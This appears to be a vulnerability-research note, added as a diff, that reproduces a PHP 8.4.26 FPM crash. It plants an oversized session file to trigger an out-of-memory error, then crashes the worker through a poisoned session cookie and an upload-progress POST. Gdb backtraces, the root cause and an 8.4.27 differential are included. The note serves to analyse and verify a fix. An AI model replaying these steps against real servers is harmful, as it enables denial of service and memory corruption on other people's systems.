@@ -1,0 +1,64 @@
+FPM chain E - PHP 8.4.26 (phpdebug:8.4.26-fpm, -O1 -g3)
+=====================================================
+
+Environment: single FPM worker (pm.max_children=1), nginx, loopback.
+php.ini: memory_limit=32M, post_max_size=128M, display_errors=On,
+session.upload_progress.enabled=On, session.upload_progress.cleanup=Off,
+session.use_strict_mode=0, session.use_only_cookies=0.
+
+PRODUCER
+--------
+Session file for SID 'hugesession000000000000000' (28 MB):
+  { printf 'k|s:29360128:"'; head -c 29360128 /dev/zero | tr '\000' 'A'; printf '";'; }
+  > /tmp/sessions/sess_hugesession000000000000000
+
+GET /session_oom.php with Cookie: PHPSESSID=hugesession000000000000000
+  Fatal error: Allowed memory size of 33554432 bytes exhausted
+  (tried to allocate 29360160 bytes)
+
+gdb attach to the idle worker after the producer:
+  (gdb) p basic_globals.unserialize.level
+  $1 = 1
+  (gdb) p/x basic_globals.unserialize.data
+  $2 = 0x7f7b81a64000
+
+CONSUMER
+--------
+POST /readpost.php (reads $_POST), multipart with PHP_SESSION_UPLOAD_PROGRESS,
+Cookie: PHPSESSID=consumerpoisoned0000000000 (session file 'a|s:1:"b";' planted).
+
+Response: nginx 502 Bad Gateway.
+
+gdb backtrace of the crash:
+
+  Program received signal SIGSEGV, Segmentation fault.
+  #0 var_push (var_hashx=0x7ffd7474d720, rval=0x7f7b81a67020)
+     at var_unserializer.c:133
+  #1 php_var_unserialize_internal :886
+  #2 php_var_unserialize :852
+  #3 ps_srlzr_decode_php at session.c:1135
+  #4 php_session_decode :279
+  #5 php_session_initialize :502
+  #6 php_session_rfc1867_update :3196
+  #7 php_session_rfc1867_callback :3335
+  #8 rfc1867_post_handler :973
+
+Root cause (8.4.26 php_var_unserialize_init):
+  if (BG(serialize_lock) || !BG(unserialize).level) { fresh init }
+  else { d = BG(unserialize).data; ++BG(unserialize).level; }   <- reuse
+
+DIFFERENTIAL 8.4.27
+-------------------
+Same sequence: 200 OK, worker stable (php_basic_early_rinit resets the state
+before rfc1867).
+
+Startup OOM with progress field (header bomb):
+  8.4.26: child exited with code 70 (502)
+  8.4.27: 200
+
+request_parse_body() on PUT with multipart:
+  8.4.26: parses and writes the session file
+  8.4.27: parses $_POST, no session write
+
+8.5.11 vs 8.5.12 with fatal_error_backtraces=1: no observable differential with
+this consumer; backtrace arm not yet measured with symbols.
